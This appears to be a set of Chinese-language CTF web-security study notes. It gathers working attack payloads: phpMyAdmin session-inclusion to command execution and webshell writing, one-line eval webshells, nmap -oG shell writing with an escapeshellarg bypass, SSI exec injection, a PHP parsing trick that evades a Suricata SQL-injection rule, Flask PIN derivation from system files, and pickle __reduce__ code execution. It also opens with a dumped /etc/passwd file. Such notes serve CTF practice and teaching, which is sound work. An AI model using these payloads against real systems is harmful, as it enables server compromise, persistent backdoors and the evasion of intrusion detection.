`root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin`

(读取内容)

#### 方法一:命令执行

尝试在`server_sql.php`页面执行`select '<?php phpinfo()?>';`：

**php**生成`session`时，会生成在`/tmp`目录下，且以`sess_`开头，例如：`/tmp/sess_be9f3bebfb7ab4192fd07c479cf6b171`，其中记录着用户的操作：(session的值按f12在应用>>cookie中可以找到)

session文件的值也就对应了 HTTP 请求 Cookie 中`phpMyAdmin`的值。
比如刚才的SQL语句被记录下来，在服务器解析该文件时，会被当作php代码执行。
尝试包含session文件：

`http://x.x.x.x/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_be9f3bebfb7ab4192fd07c479cf6b171`

刚执行的SQL查询被当作了PHP代码执行。
在SQL控制台执行：`select '<?php eval($_GET["hack"]);?>'`

将session文件包含，并使用`system()`函数实现命令执行：

`http://x.x.x.x/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_9ff5fabdce48526b442c8e16cdd83bab&hack=system(whoami);`





#### 方法二：phpMyAdmin Getshell

也可以将 WebShell 写入，首先从`phpinfo()`中查看 web 路径：
搜索`CONTEXT_DOCUMENT_ROOT`：

构造Payload：

`select "<?php file_put_contents('/var/www/html/shell.php','<?php @eval($_POST[cmd]);?>')?>"`

再次包含文件:

`http://x.x.x.x/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_2c3dd215ccd61cdb6066d8cab495bcba`

访问`http://x.x.x.x/shell.php`：

如果成功写入,就用蚁剑连接



## 覆盖试验漏洞

<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){　　　　
    $$x = $y  ;  //post 声明至当前文件
}

foreach($_GET as $x => $y){　　　 
    $$x = $$y;  //GET型变量重新赋值为当前文件变量中以其值为键名的值
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){　 //传入的变量为flag   value不是flag
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){  
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){   
    exit($is);
}



echo "the flag is: ".$flag;
}

上述为源码

核心代码:

foreach($_POST as $x => $y){　　　　
    $$x = $y  ;  //post 声明至当前文件
}

foreach($_GET as $x => $y){　　　 
    $$x = $$y;  //GET型变量重新赋值为当前文件变量中以其值为键名的值
}

### 通过第一个exit输出flag:

`?handsome=flag&flag=x&x=flag`



### 通过第二个exit输出flag:

`?yds=flag`

覆盖 yds

由于我们输入的变量是yds=flag
所以`$x`=yds `$y`=flag
`$$x `= `$$y` 所以 `$yds=$flag`
flag变量就是 我们要的东西
`exit($yds)。就是echo $flag。`



### 通过第三个exit输出flag:

`?is=flag&flag=flag`

前半段和前面的方法原理相同，让flag覆盖is
后面的`flag=flag`—>`$flag`=`$flag` 目的是为了符合第三个if需求：`（$_POST['flag'] === 'flag' || $_GET['flag'] === 'flag')`
进而输出 flag



## intval()绕过

`if(intval($num) < 2020 && intval($num + 1) > 2021)`

绕过:

用科学计数法，比如直接传1e10这种，直接判断会判断e前边的数也就是1，加一会变成判断计算后的数

`num=10e5`就可以绕过



intval() 函数可以获取变量的「整数值」。常用于[强制类型转换](https://so.csdn.net/so/search?q=强制类型转换&spm=1001.2101.3001.7020)。

**语法**

- `int intval( $var, $base )`

**参数**

- $var：需要转换成 integer 的「变量」
- $base：转换所使用的「进制」(允许为空)

返回值

返回值为 integer 类型，可能是 0 或 1 或 其他integer 值。

0：失败 或 空array 返回 0
1：非空array 返回 1
其他integer值：成功时 返回 $var 的 integer 值。
返回值的「最大值」取决于系统

32 位系统（-2147483648 到 2147483647）
64 位系统（-9223372036854775808到9223372036854775807）

### 转换数组

intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素。

- 「空数组」返回 0
- 「非空数组」返回 1

如果传入的 $var是数组中的某个值时，则当做变量来转换，而不是当做数组类型。

### 转换小数

intval() 转换小数类型时，只返回个位数，不遵循四舍五入的原则。

## 转换字符串

intval() 转换字符串类型时，会判断字符串是否以数字开头

- 如果以数字开头，就返回1个或多个连续的数字
- 如果以字母开头，就返回0

单双引号对转换结果没有影响，并且 0 或 0x 开头也只会当做普通[字符串处理](https://so.csdn.net/so/search?q=字符串处理&spm=1001.2101.3001.7020)。

### intval()绕过思路

最后汇总一下intval()函数漏洞的绕过思路：

1）当某个数字被过滤时，可以使用它的 8进制/16进制来绕过；比如过滤10，就用012（八进制）或0xA（十六进制）。
2）对于弱比较（a==b），可以给a、b两个参数传入空数组，使弱比较为true。
3）当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤3，就用3.1。
4）当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤3，就用3ab。（GET请求的参数会自动拼接单引号）
5）当某个数字被过滤时，可以两次取反来绕过；比如过滤10，就用~~10。
6）当某个数字被过滤时，可以使用算数运算符绕过；比如过滤10，就用 5+5 或 2*5。



## php反序列化逃逸

使用场景:

环境中还会把flag和php直接过滤掉,替换成空格

`$_SESSION["user"] = 'guest';`
`$_SESSION['function'] = $function;`

`extract($_POST);`

`$_SESSION['img'] = base64_encode('guest_img.png');`

`$serialize_info = filter(serialize($_SESSION));`

`$userinfo = unserialize($serialize_info);`      //核心代码

`echo file_get_contents(base64_decode($userinfo['img']));`   //核心代码



`$_SESSION["user"] = 'guest';`
`$_SESSION['function'] = 'a';`
`$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';//d0g3_f1ag.php base64编码`
`var_dump(serialize($_SESSION));`

得到输出:

`"a:3:{s:4:"user";s:5:"guest";s:8:"function";s:1:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"`

此时就可以对user和function的值就行修改实现php反序列化逃逸

### 原理:

- 序列化字符串以`;}"`结尾,可以操控

- flag等关键字过滤掉后对格式造成改变

- php特性,当序列化一合法,就会立即抛弃后面部分

### 具体实现:

首先修改function的值进行尝试修改:

`$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'`

再在后面加上一个键值对,目的是为了让序列化合法化丢弃后面部分

`$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:1:"b";}'`

此时序列化结果如下:

`a:3:{s:4:"user";s:5:"guest";s:8:"function";s:58:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"b";s:1:"a";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`

再对user进行更改:

user的值肯定要改成全是flag或者php的格式,其长度有后面部分决定,目的是为了把`";s:8:"function";s:58:"a`全都包括进来,所以长度应该是24,

那么就可以凑出user的值,此处可以是`flagflagflagflagflagflag`

此时就可以构造payload:

`_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"b";s:1:"a";}&_SESSION[user]=flagflagflagflagflagflag`



## 关于nmap命令

- `-oG`          #写入文件

	可以用来写入一句话木马

	`nmap 127.0.0.1 | <?php @eval($_POST["mayi"]);?> -oG mayi.php` 

	`nmap 127.0.0.1 | ' <?php @eval($_POST["mayi"]);?> -oG mayi.php '`   #这是绕过escapeshellarg的命令

- `-iL`			#读取扫描文件

	`nmap -iL target.txt -o result.txt`

	//扫描target.txt里面的内容并输出保存为result.txt

	`nmap 127.0.0.1' -iL /flag -o uuuu`

	#这是绕过escapeshellarg的命令

	最后要访问`uuuu'`文件



## 哈希长度拓展攻击

工具:

E:>>CTF>>xuezhang-CTF>>CTF_tools>>web>>hash-ext-attack



## SSI 远程命令执行漏洞（SSI注入漏洞）

### SSI 服务器端包含
SSI（server-side includes）能帮我们实现什么功能：
SSI提供了一种对现有HTML文档增加动态内容的方法，即在html中加入动态内容。

SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。

从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意命令。

在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用`<!--#exec cmd="ls /" -->`语法执行任意命令。


### Apache SSI 远程命令执行漏洞
当目标服务器开启了SSI与CGI支持，我们就可以上传shtml，利用`<!--#exec cmd="ls /" -->`语法来执行命令。

使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为"服务器端嵌入"或者叫"服务器端包含"，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。



## nginx配置文件存放的位置

- 配置文件存放目录：/etc/nginx
- 主配置文件：/etc/nginx/conf/nginx.conf
- 管理脚本：/usr/lib64/systemd/system/nginx.service
- 模块：/usr/lisb64/nginx/modules
- 应用程序：/usr/sbin/nginx
- 程序默认存放位置：/usr/share/nginx/html
- 日志默认存放位置：/var/log/nginx
- 配置文件目录为：/usr/local/nginx/conf/nginx.conf
	



## urlparse函数用于解析url

以下是chatgpt的解释:

`urlparse` 函数用于解析 URL（Uniform Resource Locator，统一资源定位符），将其拆分为几个组成部分，包括协议、网络位置（hostname）、路径、参数、查询和片段等。其语法如下：

```
pythonCopy Codeurllib.parse.urlparse(urlstring, scheme='', allow_fragments=True)
```

参数解释如下：

- `urlstring`：要解析的 URL 字符串。
- `scheme`：可选参数，如果 URL 没有指定协议部分，则使用此参数指定的协议。
- `allow_fragments`：可选参数，指定是否允许解析片段（fragment）部分，默认为 True，表示允许解析。

`urlparse` 函数返回一个包含解析结果的命名元组，其中包括 `scheme`、`netloc`、`path`、`params`、`query` 和 `fragment` 等属性，分别对应 URL 中的不同部分

例如:

```
from urllib.parse import urlparse

url = "https://www.example.com/path/to/resource?param1=value1&param2=value2#section1"

# 解析 URL
parsed_url = urlparse(url)

# 获取各个部分
scheme = parsed_url.scheme
netloc = parsed_url.netloc
path = parsed_url.path
params = parsed_url.params
query = parsed_url.query
fragment = parsed_url.fragment

# 打印各个部分
print("Scheme:", scheme)
print("Netloc:", netloc)
print("Path:", path)
print("Params:", params)
print("Query:", query)
print("Fragment:", fragment)
```

以上代码将输出以下结果:

```
Scheme: https
Netloc: www.example.com
Path: /path/to/resource
Params: 
Query: param1=value1&param2=value2
Fragment: section1
```



## idna与utf-8编码漏洞

```
℆这个字符,如果使用python3进行idna编码的话
print('℆'.encode('idna'))
结果
b'c/u'
如果再使用utf-8进行解码的话
print(b'c/u'.decode('utf-8'))
结果
c/u
通过这种方法可以绕过网站的一些过滤字符
```



## 计算pin码

```
username：  运行该Flask程序的用户名  /etc/passwd文件内
modname：   模块名  flask.app
getattr()： app名，值为Flask
getattr()： Flask目录下的一个app.py的绝对路径，这个值可以在报错页面看到。但有个需注意，Python3是 app.py，Python2中是app.pyc。  报错页面回显(访问报错界面 输入不能识别的参数)
str(uuid.getnode())：  MAC地址，读取这两个文件地址：/sys/class/net/eth0/address或者/sys/class/net/ens33/address
get_machine_id()：  系统id  /etc/machine-id    或者docker环境id /proc/self/cgroup
```



## nodejs中的parseInt函数

![image-20240425233112822](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425233112822.png)

绕过:

![image-20240425233145410](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425233145410.png)



![image-20240425233157687](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240425233157687.png)



## putenv('PATH=/home/rceservice/jail');

因为`putenv('PATH=/home/rceservice/jail');`修改了环境变量，所以只能使用绝对路径使用cat命令，`cat`命令在`/bin`文件夹下



## 利用PHP的字符串解析特性Bypass

**我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => "bar")。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：**

```
/news.php?%20news[id%00=42"+AND+1=0--
```

上述PHP语句的参数%20news[id%00的值将存储到$_GET["news_id"]中。

HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

> 1.删除空白符
>
> 2.将某些字符转换为下划线（包括空格）

例如：

|  User input   | Decoded PHP | variable name |
| :-----------: | :---------: | :-----------: |
| %20foo_bar%00 |   foo_bar   |    foo_bar    |
| foo%20bar%00  |   foo bar   |    foo_bar    |
|   foo%5bbar   |   foo[bar   |    foo_bar    |

### Suricata

也许你也听过这款软件，Suricata是一个“开源、成熟、快速、强大的网络威胁检测引擎”，它的引擎能够进行实时入侵检测（IDS）、入侵防御系统（IPS）、网络安全监控（NSM）和离线流量包处理。

在Suricata中你可以自定义一个HTTP流量的检测规则。假设你有这样一个规则：

```
alert http any any -> $HOME_NET any (\
    msg: "Block SQLi"; flow:established,to_server;\
    content: "POST"; http_method;\
    pcre: "/news_id=[^0-9]+/Pi";\
    sid:1234567;\
)
```

简单来说，上述规则会检查news_id的值是否是数字。那么根据上述知识，我们可以很容易的绕过防御，如下所示：

```
/?news[id=1%22+AND+1=1--'
/?news%5bid=1%22+AND+1=1--'
/?news_id%00=1%22+AND+1=1--'
```

其他更多参考:

[利用PHP的字符串解析特性Bypass - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/213359.html)



## jsfuck

形如

+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+

应该就是jsfuck

复制下来输入到控制台回车即可



## $ip = getIp();

具体waf:

```
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
```

绕过方法:

使用burp抓包后在后面添加:

`Client-ip: 127.0.0.1`



## $_SERVER['PHP_SELF']

$_SERVER['PHP_SELF']代表的当前php文件的绝对路径



## basename()漏洞

basename() 函数返回路径中的文件名部分。但是它有个小问题，它会去掉文件名开头的非ASCII值。比如：

```
$url1 = “path/index.php”; // 返回index.php
$url2 = “path/index.php”.urldecode(’%D1%A7%CF’); // 返回index.php和乱码
$url3 = urldecode(’%D1%A7%CF%B0flag.php+ '); // 返回flag.php，前面的非acsii被删除
$url4 = urldecode(’%74%65%73%74%5fflag.php+%D1%A7%CF%B0 '); // 返回flag.php和 后面的非ascii
```

一道例题源码:

```
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}
```

payload:

```
…/index.php/config.php/%ff?source
…/index.php/config.php/%a1?source
…/index.php/config.php/%df?source
```

上面的payload随便哪一个都可以，**主要是保证config.php后面必须是非ascii值就可以了**



## pickle反序列化

### pickle简介

- 与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。
- python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。
- 与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。
- pickle实际上可以看作一种**独立的语言**，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。

### 可序列化的对象

- `None` 、 `True` 和 `False`
- 整数、浮点数、复数
- str、byte、bytearray
- 只包含可封存对象的集合，包括 tuple、list、set 和 dict
- 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）
- 定义在模块最外层的内置函数
- 定义在模块最外层的类
- `__dict__` 属性值或 `__getstate__()` 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）

### `object.__reduce__()` 函数

- 在开发时，可以通过重写类的 `object.__reduce__()` 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 `object.__reduce__()` 返回一个 `(callable, ([para1,para2...])[,...])` 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。
- 在下文pickle的opcode中， `R` 的作用与 `object.__reduce__()` 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 `R` 正好对应 `object.__reduce__()` 函数， `object.__reduce__()` 的返回值会作为 `R` 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 `R` 的。

### 漏洞利用

#### 利用思路

- 任意代码执行或命令执行。
- 变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。

#### 初步认识：pickle EXP的简单demo

```
import pickle
import os

class genpoc(object):
    def __reduce__(self):
        s = """echo test >poc.txt"""  # 要执行的命令
        return os.system, (s,)        # reduce函数必须返回元组或字符串

e = genpoc()
poc = pickle.dumps(e)

print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令
```

- 变量覆盖

```
import pickle

key1 = b'321'
key2 = b'123'
class A(object):
    def __reduce__(self):
        return (exec,("key1=b'1'\nkey2=b'2'",))

a = A()
pickle_a = pickle.dumps(a)
print(pickle_a)
pickle.loads(pickle_a)
print(key1, key2)
```

## php中??的作用

```
$a??$b;
$a是不是null，如果不为null，则返回$a，否则返回$b;
```



## php短标签

```
php短标签
 
<? echo '123';?>  #前提是开启配置参数short_open_tags=on
<?=(表达式)?>  等价于 <?php echo (表达式)?>  #不需要开启参数设置
<% echo '123';%>   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用
<script language="php">echo '123'; </script> #不需要修改参数开关，但是只能在7.0以下可用。
 
```

